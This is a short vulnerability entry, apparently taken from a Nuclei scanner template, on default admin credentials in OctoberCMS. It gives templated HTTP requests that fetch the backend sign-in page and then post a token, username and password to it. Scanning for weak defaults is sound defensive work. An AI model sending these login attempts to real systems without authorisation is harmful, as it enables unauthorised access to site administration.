# Vulnerability: OctoberCMS - Default Admin Discovery
**Classification:** CWE-522
**Source:** Nuclei Template (`octobercms-default-login.yaml`)

## Description
OctoberCMS default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /backend/backend/auth/signin HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

POST /backend/backend/auth/signin HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

_token={{token}}&postback=1&login={{username}}&password={{password}}
```

